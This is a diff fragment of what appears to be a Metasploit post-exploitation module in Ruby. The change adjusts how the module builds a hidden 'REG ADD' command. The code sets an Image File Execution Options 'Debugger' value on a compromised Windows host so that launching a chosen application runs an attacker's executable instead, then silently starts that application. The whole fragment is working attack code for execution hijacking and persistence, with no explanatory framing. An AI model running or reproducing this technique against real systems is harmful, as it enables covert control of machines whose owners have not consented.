@@ -149,7 +149,7 @@ def hijack_funtion
   executable = datastore['EXEC']
   exec_hijack = datastore['HIJACK']
   reg_hive = "HKLM\\SOFTWARE\\Microsoft\\Windows NT\\CurrentVersion"
-  reg_make = "REG ADD HKLM\\SOFTWARE\\Microsoft\\Windows NT\\CurrentVersion\\Image File Execution Options\\#{exec_hijack}"
+  reg_make = "HKLM\\SOFTWARE\\Microsoft\\Windows NT\\CurrentVersion\\Image File Execution Options\\#{exec_hijack}"
   #
   # Check if module options are rigth configurated ..
   #
@@ -175,7 +175,7 @@ def hijack_funtion
       #
       # PLacing new registry hive/keys, And start hijacked application ..
       #
-      r = session.sys.process.execute("cmd.exe /c \"#{reg_make}\" /v Debugger /t REG_SZ /d #{executable} /f", nil, {'Hidden' => true, 'Channelized' => true})
+      r = session.sys.process.execute("cmd.exe /c REG ADD \"#{reg_make}\" /v Debugger /t REG_SZ /d #{executable} /f", nil, {'Hidden' => true, 'Channelized' => true})
       Rex::sleep(2.0)
       print_good(" exec => start #{exec_hijack} application ..")
       r = session.sys.process.execute("cmd.exe /c start \"#{exec_hijack}\"", nil, {'Hidden' => true, 'Channelized' => true})
